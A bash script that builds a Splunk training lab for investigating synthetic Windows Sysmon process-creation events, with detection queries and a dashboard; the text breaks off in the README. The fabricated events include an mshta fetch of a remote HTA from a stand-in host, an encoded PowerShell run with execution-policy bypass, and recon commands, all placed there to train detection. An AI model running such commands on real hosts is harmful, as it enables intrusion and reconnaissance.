#!/usr/bin/env bash
# Splunk Lab 02 — Windows / Sysmon Process Investigation
# Master build / execution script
#
# Purpose:
#   Build a reproducible, synthetic Windows Sysmon process-investigation lab,
#   execute the investigation in a local Splunk instance, generate portfolio
#   documentation, validate the dashboard, and prepare Git evidence.
#
# Safety:
#   - Synthetic telemetry only.
#   - Uses a dedicated index: splunk_lab_sysmon.
#   - Does NOT delete or modify Lab 01 data.
#   - Does NOT fabricate screenshots or claim dashboard capture until the user
#     captures the actual rendered dashboard.
#
# Usage:
#   chmod +x scripts/splunk-lab-02-build.sh
#   ./scripts/splunk-lab-02-build.sh
#
# Optional environment:
#   SPLUNK_USER=admin
#   SPLUNK_PASS='your-password'
#   SPLUNK_URL=https://127.0.0.1:8089
#   SPLUNK_WEB_URL=https://127.0.0.1:8000
#
# Git behavior:
#   By default, the script prepares and commits only Lab 02 files plus this
#   script if it was created inside the repository. It does NOT push or merge.
#   Set PUSH_BRANCH=1 to push the branch after committing.

set -Eeuo pipefail
IFS=$'\n\t'

SCRIPT_VERSION="1.0.1"
REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
LAB_ROOT="$REPO_ROOT/SIEM/Splunk/Lab-02-Windows-Sysmon-Process-Investigation"
DATA_DIR="$LAB_ROOT/data"
SPL_DIR="$LAB_ROOT/spl"
REPORT_DIR="$LAB_ROOT/reports"
DASH_DIR="$LAB_ROOT/dashboard"
EVIDENCE_DIR="$LAB_ROOT/evidence"
LOCAL_APP="/opt/splunk/etc/apps/splunk_lab_sysmon"
LOCAL_DIR="$LOCAL_APP/local"

INDEX="splunk_lab_sysmon"
SOURCETYPE="splunk:lab:sysmon"
DASHBOARD_ID="soc_windows_sysmon_process_investigation"
DASHBOARD_TITLE="SOC Windows / Sysmon Process Investigation"
BRANCH="security/splunk-lab-02-sysmon-process-investigation"

SPLUNK_URL="${SPLUNK_URL:-https://127.0.0.1:8089}"
SPLUNK_WEB_URL="${SPLUNK_WEB_URL:-http://127.0.0.1:8000}"
SPLUNK_USER="${SPLUNK_USER:-admin}"
SPLUNK_PASS="${SPLUNK_PASS:-}"

log()  { printf '\n[%s] %s\n' "$(date '+%H:%M:%S')" "$*"; }
warn() { printf '\n[WARN] %s\n' "$*" >&2; }
die()  { printf '\n[ERROR] %s\n' "$*" >&2; exit 1; }

cleanup_on_error() {
    local rc=$?
    printf '\n[ERROR] Lab 02 build stopped with exit code %s.\n' "$rc" >&2
    printf '[ERROR] No Git push was performed automatically.\n' >&2
    exit "$rc"
}
trap cleanup_on_error ERR

need_cmd() {
    command -v "$1" >/dev/null 2>&1 || die "Required command not found: $1"
}

urlencode() {
    python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"
}

splunk_curl() {
    curl -ksS --fail-with-body -u "$SPLUNK_USER:$SPLUNK_PASS" "$@"
}

splunk_search() {
    local search="$1"
    local earliest="${2:--30d}"
    local latest="${3:-now}"
    splunk_curl "$SPLUNK_URL/services/search/jobs/export" \
        --data-urlencode "search=search $search" \
        --data-urlencode "earliest_time=$earliest" \
        --data-urlencode "latest_time=$latest" \
        --data-urlencode "output_mode=json"
}

assert_repo() {
    git -C "$REPO_ROOT" rev-parse --is-inside-work-tree >/dev/null
    [[ "$(git -C "$REPO_ROOT" branch --show-current)" != "main" ]] || \
        warn "You are currently on main. The script will create/use: $BRANCH"
}

preflight() {
    log "Splunk Lab 02 master build v$SCRIPT_VERSION"
    need_cmd git
    need_cmd curl
    need_cmd python3
    need_cmd awk
    need_cmd sed
    need_cmd grep
    need_cmd find
    assert_repo

    [[ -x /opt/splunk/bin/splunk ]] || die "/opt/splunk/bin/splunk not found."
    sudo -u splunk /opt/splunk/bin/splunk status >/dev/null 2>&1 || \
        die "Splunk is not running. Start it first: sudo -u splunk /opt/splunk/bin/splunk start"

    if [[ -z "$SPLUNK_PASS" ]]; then
        read -r -s -p "Splunk password for $SPLUNK_USER: " SPLUNK_PASS
        printf '\n'
    fi

    splunk_curl "$SPLUNK_URL/services/server/info?output_mode=json" >/dev/null || \
        die "Cannot authenticate to Splunk REST API at $SPLUNK_URL"

    mkdir -p "$DATA_DIR" "$SPL_DIR" "$REPORT_DIR" "$DASH_DIR" "$EVIDENCE_DIR"

    log "Pre-flight checks passed."
}

prepare_branch() {
    if git -C "$REPO_ROOT" show-ref --verify --quiet "refs/heads/$BRANCH"; then
        git -C "$REPO_ROOT" switch "$BRANCH"
    else
        git -C "$REPO_ROOT" switch -c "$BRANCH"
    fi
}

write_synthetic_data() {
    log "Generating deterministic synthetic Sysmon Event ID 1 dataset."

    python3 - "$DATA_DIR/sysmon_process_creation.csv" <<'PY'
import csv
from datetime import datetime, timedelta, timezone
from pathlib import Path
import sys

out = Path(sys.argv[1])
start = datetime(2026, 9, 25, 8, 0, 0, tzinfo=timezone.utc)

rows = []
seq = 0

def add(offset_s, host, user, image, parent, cmd, parent_cmd, integrity="Medium", logon="Interactive"):
    global seq
    seq += 1
    t = start + timedelta(seconds=offset_s)
    rows.append({
        "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "event_id": 1,
        "host": host,
        "user": user,
        "image": image,
        "parent_image": parent,
        "command_line": cmd,
        "parent_command_line": parent_cmd,
        "integrity_level": integrity,
        "logon_type": logon,
        "process_id": 1000 + seq,
        "parent_process_id": 900 + seq,
        "hash_sha256": f"SYNTHETIC-{seq:04d}",
        "event_source": "Microsoft-Windows-Sysmon/Operational"
    })

# Benign workstation activity.
add(5,   "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\userinit.exe", r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\userinit.exe")
add(15,  "WIN-WS01", "CONTOSO\\alice", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Windows\explorer.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe"',
    r"C:\Windows\explorer.exe")
add(30,  "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\notepad.exe",
    r"C:\Windows\explorer.exe", r"C:\Windows\System32\notepad.exe",
    r"C:\Windows\explorer.exe")
add(50,  "WIN-WS02", "CONTOSO\\bob", r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\userinit.exe", r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\userinit.exe")
add(65,  "WIN-WS02", "CONTOSO\\bob", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    r"C:\Windows\explorer.exe", r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"',
    r"C:\Windows\explorer.exe")
add(80,  "WIN-WS03", "CONTOSO\\carol", r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\services.exe", r"C:\Windows\System32\svchost.exe -k netsvcs",
    r"C:\Windows\System32\services.exe", "System", "Service")

# Suspicious PowerShell chain on WIN-WS01.
add(300, "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\wscript.exe",
    r'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SYNTHETIC_PAYLOAD_A',
    r'wscript.exe C:\Users\Public\update.vbs', "High")
add(305, "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r'cmd.exe /c whoami && ipconfig /all',
    r'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SYNTHETIC_PAYLOAD_A', "High")
add(310, "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\net.exe",
    r"C:\Windows\System32\cmd.exe",
    r'net.exe user',
    r'cmd.exe /c whoami && ipconfig /all', "High")
add(315, "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\whoami.exe",
    r"C:\Windows\System32\cmd.exe",
    r'whoami.exe /all',
    r'cmd.exe /c whoami && ipconfig /all', "High")
add(320, "WIN-WS01", "CONTOSO\\alice", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\cmd.exe",
    r'powershell.exe -NoProfile -Command "Get-Process; Get-Service"',
    r'cmd.exe /c whoami && ipconfig /all', "High")

# Suspicious LOLBin-style chain on WIN-WS02.
add(600, "WIN-WS02", "CONTOSO\\bob", r"C:\Windows\System32\mshta.exe",
    r"C:\Windows\explorer.exe",
    r'mshta.exe https://example.invalid/update.hta',
    r"C:\Windows\explorer.exe", "High")
add(605, "WIN-WS02", "CONTOSO\\bob", r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\mshta.exe",
    r'cmd.exe /c whoami',
    r'mshta.exe https://example.invalid/update.hta', "High")
add(610, "WIN-WS02", "CONTOSO\\bob", r"C:\Windows\System32\ipconfig.exe",
    r"C:\Windows\System32\cmd.exe",
    r'ipconfig.exe /all',
    r'cmd.exe /c whoami', "High")
add(615, "WIN-WS02", "CONTOSO\\bob", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\cmd.exe",
    r'powershell.exe -NoProfile -Command "Get-CimInstance Win32_Process"',
    r'cmd.exe /c whoami', "High")

# Service-created process chain.
add(900, "WIN-SRV01", "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\services.exe",
    r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted",
    r"C:\Windows\System32\services.exe", "System", "Service")
add(915, "WIN-SRV01", "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\svchost.exe",
    r'cmd.exe /c "C:\ProgramData\maintenance.cmd"',
    r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted", "System", "Service")
add(920, "WIN-SRV01", "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\wevtutil.exe",
    r"C:\Windows\System32\cmd.exe",
    r'wevtutil.exe qe Security /c:20',
    r'cmd.exe /c "C:\ProgramData\maintenance.cmd"', "System", "Service")

# More benign process creation for realistic volume.
for i in range(14):
    add(1100 + i*20, "WIN-WS03", "CONTOSO\\carol",
        r"C:\Windows\System32\svchost.exe",
        r"C:\Windows\System32\services.exe",
        r"C:\Windows\System32\svchost.exe -k LocalService",
        r"C:\Windows\System32\services.exe", "System", "Service")

fields = [
    "timestamp","event_id","host","user","image","parent_image","command_line",
    "parent_command_line","integrity_level","logon_type","process_id",
    "parent_process_id","hash_sha256","event_source"
]
with out.open("w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=fields)
    w.writeheader()
    w.writerows(rows)

print(f"Wrote {len(rows)} synthetic Sysmon events to {out}")
PY
}

configure_splunk() {
    log "Configuring dedicated Splunk app/index/sourcetype."

    sudo mkdir -p "$LOCAL_DIR"
    sudo chown -R splunk:splunk "$LOCAL_APP"

    sudo mkdir -p "$LOCAL_APP/default"
    sudo tee "$LOCAL_APP/default/app.conf" >/dev/null <<'EOF'
[install]
is_configured = 1

[ui]
is_visible = 1
label = Splunk Lab 02 - Windows Sysmon

[launcher]
author = Portfolio Lab
description = Synthetic Windows Sysmon process investigation lab
version = 1.0.0
EOF

    sudo tee "$LOCAL_DIR/props.conf" >/dev/null <<EOF
[$SOURCETYPE]
INDEXED_EXTRACTIONS = CSV
FIELD_DELIMITER = ,
FIELD_QUOTE = "
HEADER_FIELD_LINE_NUMBER = 1
TIMESTAMP_FIELDS = timestamp
TIME_FORMAT = %Y-%m-%dT%H:%M:%SZ
SHOULD_LINEMERGE = false
KV_MODE = none
EOF

    sudo tee "$LOCAL_DIR/indexes.conf" >/dev/null <<EOF
[$INDEX]
homePath = \$SPLUNK_DB/$INDEX/db
coldPath = \$SPLUNK_DB/$INDEX/colddb
thawedPath = \$SPLUNK_DB/$INDEX/thaweddb
maxTotalDataSizeMB = 256
frozenTimePeriodInSecs = 31536000
EOF

    sudo chown -R splunk:splunk "$LOCAL_APP"

    # Create index through REST if it does not exist.
    if ! splunk_curl "$SPLUNK_URL/services/data/indexes/$INDEX?output_mode=json" >/dev/null 2>&1; then
        splunk_curl --request POST "$SPLUNK_URL/services/data/indexes" \
            --data-urlencode "name=$INDEX" \
            --data-urlencode "homePath=\$SPLUNK_DB/$INDEX/db" \
            --data-urlencode "coldPath=\$SPLUNK_DB/$INDEX/colddb" \
            --data-urlencode "thawedPath=\$SPLUNK_DB/$INDEX/thaweddb" \
            --data-urlencode "frozenTimePeriodInSecs=31536000" >/dev/null
        log "Created index: $INDEX"
    else
        log "Index already exists: $INDEX"
    fi

    sudo -u splunk /opt/splunk/bin/splunk btool props list "$SOURCETYPE" --debug \
        | grep -q "INDEXED_EXTRACTIONS" || \
        warn "btool did not expose INDEXED_EXTRACTIONS yet; continuing with REST validation."
}

import_data() {
    log "Checking whether Lab 02 data is already indexed."

    local count
    count="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" | stats count as count" \
        | python3 -c 'import json,sys; s=sys.stdin.read().strip(); print(json.loads(s)["result"]["count"] if s else 0)' 2>/dev/null || echo 0)"

    if [[ "$count" != "0" ]]; then
        log "Existing Lab 02 events detected: $count. No duplicate import performed."
        return
    fi

    log "Importing synthetic Sysmon CSV into $INDEX."

    sudo -u splunk /opt/splunk/bin/splunk add oneshot \
        "$DATA_DIR/sysmon_process_creation.csv" \
        -index "$INDEX" \
        -sourcetype "$SOURCETYPE" \
        -auth "$SPLUNK_USER:$SPLUNK_PASS"

    sleep 3

    count="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" | stats count as count" \
        | python3 -c 'import json,sys; s=sys.stdin.read().strip(); print(json.loads(s)["result"]["count"] if s else 0)' 2>/dev/null || echo 0)"

    [[ "$count" -ge 30 ]] || die "Expected at least 30 Sysmon events, found $count."
    log "Indexed $count Sysmon events."
}

write_spl() {
    log "Writing investigation and detection SPL."

    cat > "$SPL_DIR/process-investigation.spl" <<'EOF'
# 1. Baseline process creation volume
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| stats count as process_events

# 2. Top processes
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| stats count as events by image
| sort - events

# 3. Parent-child relationships
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| stats count as events by parent_image image
| sort - events

# 4. PowerShell activity
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| search image="*powershell.exe"
| table timestamp host user parent_image image command_line parent_command_line
| sort 0 timestamp

# 5. Suspicious command-line indicators
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| eval suspicious=if(
    match(lower(command_line),"encodedcommand|executionpolicy\s+bypass|downloadstring|invoke-expression|iex\s|frombase64string")
    OR match(lower(image),"mshta\.exe|rundll32\.exe|regsvr32\.exe|wscript\.exe|cscript\.exe"),
    1, 0)
| where suspicious=1
| table timestamp host user parent_image image command_line
| sort 0 timestamp

# 6. High-integrity suspicious processes
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| search integrity_level=High
| stats count as events values(command_line) as command_lines by host user image parent_image
| sort - events

# 7. Process investigation timeline
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon"
| sort 0 timestamp
| table timestamp host user image parent_image command_line process_id parent_process_id
EOF

    cat > "$SPL_DIR/detection-rules.spl" <<'EOF'
# Detection 01 — PowerShell with encoded command or execution-policy bypass
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| search image="*powershell.exe"
| where match(lower(command_line),"encodedcommand|executionpolicy\s+bypass")
| eval detection="PowerShell encoded command / execution policy bypass"
| table timestamp host user parent_image image command_line detection

# Detection 02 — Suspicious LOLBin execution
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| where match(lower(image),"mshta\.exe|rundll32\.exe|regsvr32\.exe|wscript\.exe|cscript\.exe")
| eval detection="Potential LOLBin execution"
| table timestamp host user parent_image image command_line detection

# Detection 03 — Suspicious process ancestry
index=splunk_lab_sysmon sourcetype="splunk:lab:sysmon" event_id=1
| where match(lower(parent_image),"wscript\.exe|mshta\.exe|winword\.exe|excel\.exe")
    AND match(lower(image),"powershell\.exe|cmd\.exe|mshta\.exe")
| eval detection="Suspicious parent-child process chain"
| table timestamp host user parent_image image command_line detection
EOF
}

run_queries() {
    log "Executing investigation queries against actual Splunk data."

    local baseline power suspicious chains
    baseline="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | stats count as total_events")"
    power="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | search image=\"*powershell.exe\" | stats count as powershell_events")"
    suspicious="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | eval suspicious=if(match(lower(command_line),\"encodedcommand|executionpolicy\\\\s+bypass|downloadstring|invoke-expression|iex\\\\s|frombase64string\") OR match(lower(image),\"mshta\\\\.exe|rundll32\\\\.exe|regsvr32\\\\.exe|wscript\\\\.exe|cscript\\\\.exe\"),1,0) | where suspicious=1 | stats count as suspicious_events")"
    chains="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | stats count as events by parent_image image | sort - events | head 15")"

    printf '%s\n' "$baseline" > "$REPORT_DIR/.baseline.json"
    printf '%s\n' "$power" > "$REPORT_DIR/.powershell.json"
    printf '%s\n' "$suspicious" > "$REPORT_DIR/.suspicious.json"
    printf '%s\n' "$chains" > "$REPORT_DIR/.chains.json"

    local total powershell_events suspicious_events
    total="$(python3 - "$REPORT_DIR/.baseline.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
print(d["result"]["total_events"])
PY
)"
    powershell_events="$(python3 - "$REPORT_DIR/.powershell.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
print(d["result"]["powershell_events"])
PY
)"
    suspicious_events="$(python3 - "$REPORT_DIR/.suspicious.json" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
print(d["result"]["suspicious_events"])
PY
)"

    [[ "$total" -ge 30 ]] || die "Baseline validation failed: total_events=$total"
    [[ "$powershell_events" -ge 1 ]] || die "PowerShell validation failed."
    [[ "$suspicious_events" -ge 1 ]] || die "Suspicious-process validation failed."

    cat > "$REPORT_DIR/execution-results.md" <<EOF
# Lab 02 Execution Results

Generated from the live local Splunk instance.

- Total Sysmon process-creation events: **$total**
- PowerShell process events: **$powershell_events**
- Suspicious process/command-line events: **$suspicious_events**

These values were retrieved from Splunk after ingestion and are not hard-coded lab claims.

## Parent/Child Evidence

See \`process-investigation.spl\` and the Splunk search results for the observed parent-child relationships.

## Important limitation

The telemetry is synthetic. It demonstrates investigation technique and detection logic; it does not establish a real-world compromise.
EOF

    rm -f "$REPORT_DIR"/.baseline.json "$REPORT_DIR"/.powershell.json \
          "$REPORT_DIR"/.suspicious.json "$REPORT_DIR"/.chains.json

    log "Investigation query validation passed."
}

write_dashboard() {
    log "Writing Dashboard Studio specification."

    cat > "$DASH_DIR/SOC-Windows-Sysmon-Process-Investigation.md" <<EOF
# SOC Windows / Sysmon Process Investigation Dashboard

## Dashboard ID

\`$DASHBOARD_ID\`

## Data source

- Index: \`$INDEX\`
- Sourcetype: \`$SOURCETYPE\`
- Telemetry: synthetic Windows Sysmon Event ID 1 process creation

## Planned panels

1. Total Process Creation Events
2. PowerShell Activity
3. Suspicious Process / Command-Line Events
4. Top Processes
5. Top Parent → Child Relationships
6. Suspicious Process Timeline
7. Investigation Events Table

## Lab relationship

This dashboard extends the investigation workflow established in:

**Splunk Lab 01 — SSH Authentication Threat Hunting**

Lab 01 focused on authentication source/account relationships and timeline analysis.

Lab 02 moves from authentication telemetry into endpoint process telemetry, allowing the analyst to investigate what execution occurred on a Windows host.

## Validation

The dashboard must be visually reviewed in Splunk before screenshot evidence is marked complete.
EOF

    cat > "$DASH_DIR/dashboard-studio.json" <<EOF
{
  "visualizations": {
    "viz_total": {
      "type": "splunk.singlevalue",
      "dataSources": {"primary": "ds_total"},
      "title": "Total Process Events",
      "options": {"majorColor": "#2E7D32"}
    },
    "viz_powershell": {
      "type": "splunk.singlevalue",
      "dataSources": {"primary": "ds_powershell"},
      "title": "PowerShell Events",
      "options": {"majorColor": "#1565C0"}
    },
    "viz_suspicious": {
      "type": "splunk.singlevalue",
      "dataSources": {"primary": "ds_suspicious"},
      "title": "Suspicious Process Events",
      "options": {"majorColor": "#C62828"}
    },
    "viz_top_processes": {
      "type": "splunk.bar",
      "dataSources": {"primary": "ds_top_processes"},
      "options": {
        "barSpacing": 20,
        "xAxisTitleText": "Process",
        "yAxisTitleText": "Events"
      }
    },
    "viz_parent_child": {
      "type": "splunk.bar",
      "dataSources": {"primary": "ds_parent_child"},
      "options": {
        "barSpacing": 20,
        "xAxisTitleText": "Parent → Child",
        "yAxisTitleText": "Events"
      }
    },
    "viz_timeline": {
      "type": "splunk.line",
      "dataSources": {"primary": "ds_timeline"},
      "options": {
        "xAxisTitleText": "Time",
        "yAxisTitleText": "Process Events"
      }
    },
    "viz_investigation": {
      "type": "splunk.table",
      "dataSources": {"primary": "ds_investigation"},
      "options": {
        "count": 15,
        "showRowNumbers": false,
        "wrap": true
      }
    }
  },
  "dataSources": {
    "ds_total": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | stats count as total_events"
      }
    },
    "ds_powershell": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | search image=\"*powershell.exe\" | stats count as powershell_events"
      }
    },
    "ds_suspicious": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | eval suspicious=if(match(lower(command_line),\"encodedcommand|executionpolicy\\\\s+bypass|downloadstring|invoke-expression|iex\\\\s|frombase64string\") OR match(lower(image),\"mshta\\\\.exe|rundll32\\\\.exe|regsvr32\\\\.exe|wscript\\\\.exe|cscript\\\\.exe\"),1,0) | where suspicious=1 | stats count as suspicious_events"
      }
    },
    "ds_top_processes": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | stats count as events by image | sort - events | head 10"
      }
    },
    "ds_parent_child": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | eval relationship=parent_image.\" → \".image | stats count as events by relationship | sort - events | head 10"
      }
    },
    "ds_timeline": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | timechart span=1m count by host"
      }
    },
    "ds_investigation": {
      "type": "ds.search",
      "options": {
        "query": "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | eval suspicious=if(match(lower(command_line),\"encodedcommand|executionpolicy\\\\s+bypass|downloadstring|invoke-expression|iex\\\\s|frombase64string\") OR match(lower(image),\"mshta\\\\.exe|rundll32\\\\.exe|regsvr32\\\\.exe|wscript\\\\.exe|cscript\\\\.exe\"),1,0) | where suspicious=1 | table timestamp host user parent_image image command_line integrity_level | sort 0 timestamp"
      }
    }
  },
  "layout": {
    "options": {
      "showTitleAndDescription": true,
      "submitButton": false
    },
    "tabs": {
      "items": [
        {
          "label": "SOC Overview",
          "layoutId": "layout_1"
        }
      ]
    },
    "layoutDefinitions": {
      "layout_1": {
        "type": "absolute",
        "options": {
          "display": "auto-scale",
          "width": 1200,
          "height": 1260
        },
        "structure": [
          {
            "item": "viz_total",
            "type": "block",
            "position": {
              "x": 0,
              "y": 0,
              "w": 380,
              "h": 150
            }
          },
          {
            "item": "viz_powershell",
            "type": "block",
            "position": {
              "x": 410,
              "y": 0,
              "w": 380,
              "h": 150
            }
          },
          {
            "item": "viz_suspicious",
            "type": "block",
            "position": {
              "x": 820,
              "y": 0,
              "w": 380,
              "h": 150
            }
          },
          {
            "item": "viz_top_processes",
            "type": "block",
            "position": {
              "x": 0,
              "y": 180,
              "w": 580,
              "h": 320
            }
          },
          {
            "item": "viz_parent_child",
            "type": "block",
            "position": {
              "x": 620,
              "y": 180,
              "w": 580,
              "h": 320
            }
          },
          {
            "item": "viz_timeline",
            "type": "block",
            "position": {
              "x": 0,
              "y": 530,
              "w": 1200,
              "h": 300
            }
          },
          {
            "item": "viz_investigation",
            "type": "block",
            "position": {
              "x": 0,
              "y": 860,
              "w": 1200,
              "h": 400
            }
          }
        ]
      }
    }
  },
  "title": "$DASHBOARD_TITLE",
  "description": "Synthetic Windows Sysmon process investigation dashboard for Splunk SOC Lab 02."
}
EOF
}

install_dashboard() {
    log "Installing/validating Dashboard Studio definition through Splunk REST API."

    local dashboard_json="$DASH_DIR/dashboard-studio.json"
    local xml_file="/tmp/splunk-lab-02-dashboard.xml"

    python3 - "$dashboard_json" "$xml_file" "$DASHBOARD_TITLE" <<'PY'
import json,sys,html
src, out, title = sys.argv[1], sys.argv[2], sys.argv[3]
data = json.load(open(src))
payload = html.escape(json.dumps(data, separators=(",",":")))
xml = f'<dashboard version="2"><label>{html.escape(title)}</label><description>Synthetic Windows Sysmon process investigation dashboard for Splunk SOC Lab 02.</description><definition>{payload}</definition></dashboard>'
open(out,"w").write(xml)
PY

    # Try the same Dashboard Studio API pattern used by the portfolio's Lab 01.
    local endpoint="$SPLUNK_URL/servicesNS/$SPLUNK_USER/search/data/ui/views/$DASHBOARD_ID"
    local response

    # Check whether the view already exists. If it does, update it (no "name" field,
    # since Splunk treats a POST with "name" as a create and rejects duplicates).
    if splunk_curl "$endpoint?output_mode=json" >/dev/null 2>&1; then
        log "Dashboard already exists. Updating definition."
        response="$(curl -ksS -u "$SPLUNK_USER:$SPLUNK_PASS" \
            --request POST "$endpoint" \
            --data-urlencode "eai:data=$(cat "$xml_file")" 2>&1)" || {
                warn "Dashboard REST POST (update) returned an error. The JSON definition is still preserved in the repository."
                printf '%s\n' "$response" > "$DASH_DIR/dashboard-rest-response.txt"
                return 0
            }
    else
        log "Dashboard does not exist yet. Creating it."
        response="$(curl -ksS -u "$SPLUNK_USER:$SPLUNK_PASS" \
            --request POST "$endpoint" \
            --data-urlencode "name=$DASHBOARD_ID" \
            --data-urlencode "eai:data=$(cat "$xml_file")" 2>&1)" || {
                warn "Dashboard REST POST (create) returned an error. The JSON definition is still preserved in the repository."
                printf '%s\n' "$response" > "$DASH_DIR/dashboard-rest-response.txt"
                return 0
            }
    fi

    printf '%s\n' "$response" > "$DASH_DIR/dashboard-rest-response.txt"

    if printf '%s' "$response" | grep -qi '"type">ERROR\|type="ERROR"'; then
        warn "Dashboard REST POST response contained an ERROR message. Review dashboard-rest-response.txt."
        return 0
    fi

    # Splunk auto-assigns sensible ACL defaults (owner, app, sharing) at creation time
    # from the embedded XML/namespace, so no separate ACL call is needed.

    # Confirm the endpoint exists.
    if splunk_curl "$endpoint?output_mode=json" >/dev/null 2>&1; then
        echo "REST dashboard endpoint validated." >> "$DASH_DIR/dashboard-rest-response.txt"
        log "Dashboard endpoint validated."
    else
        warn "Dashboard endpoint could not be re-read. Review dashboard-rest-response.txt."
    fi

    rm -f "$xml_file"
}

write_report_and_readme() {
    log "Writing portfolio README, report and evidence instructions."

    local total powershell suspicious
    total="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | stats count as total_events" \
        | python3 -c 'import json,sys; print(json.load(sys.stdin)["result"]["total_events"])')"
    powershell="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | search image=\"*powershell.exe\" | stats count as powershell_events" \
        | python3 -c 'import json,sys; print(json.load(sys.stdin)["result"]["powershell_events"])')"
    suspicious="$(splunk_search "index=$INDEX sourcetype=\"$SOURCETYPE\" event_id=1 | eval suspicious=if(match(lower(command_line),\"encodedcommand|executionpolicy\\\\s+bypass|downloadstring|invoke-expression|iex\\\\s|frombase64string\") OR match(lower(image),\"mshta\\\\.exe|rundll32\\\\.exe|regsvr32\\\\.exe|wscript\\\\.exe|cscript\\\\.exe\"),1,0) | where suspicious=1 | stats count as suspicious_events" \
        | python3 -c 'import json,sys; print(json.load(sys.stdin)["result"]["suspicious_events"])')"

    cat > "$REPORT_DIR/SOC-Investigation-Report.md" <<EOF
# SOC Investigation Report — Splunk Lab 02

## Case

**Lab:** Splunk SOC Lab 02 — Windows / Sysmon Process Investigation

**Evidence classification:** Authorized local training lab using synthetic telemetry.

## Scope

The investigation covers Windows Sysmon Event ID 1-style process creation telemetry indexed into:

- Index: \`$INDEX\`
- Sourcetype: \`$SOURCETYPE\`

## Execution results

- Total process creation events: **$total**
- PowerShell events: **$powershell**
- Suspicious process/command-line events identified by the lab detection logic: **$suspicious**

## Investigation approach

1. Establish baseline process creation volume.
2. Identify common processes.
3. Examine parent → child relationships.
4. Isolate PowerShell execution.
5. identify suspicious command-line indicators.
6. Examine high-integrity processes.
7. Reconstruct the process timeline.
8. Validate detection logic against observed telemetry.

## Relationship to Lab 01

Lab 01 investigated SSH authentication telemetry, including source IPs, target accounts, authentication outcomes and timelines.

Lab 02 extends the same SOC investigation workflow into Windows endpoint telemetry.

The conceptual progression is:

\`Authentication → Host activity → Process execution → Detection → Investigation\`

## Evidence limitations

The dataset is synthetic. Suspicious-looking process chains demonstrate investigation and detection technique but do not prove that a real system was compromised.

## MITRE ATT&CK

Potential mappings are documented only where the synthetic telemetry and detection logic provide supporting evidence. No ATT&CK technique should be represented as observed beyond what the dataset actually demonstrates.

## Next investigative step

In a real SOC, correlate process creation with authentication, network, endpoint, persistence and security-control telemetry before making an incident determination.
EOF

    cat > "$LAB_ROOT/README.md" <<EOF
# Splunk SOC Lab 02 — Windows / Sysmon Process Investigation

> **Evidence classification: Executed local training lab using synthetic telemetry.**

## Objective

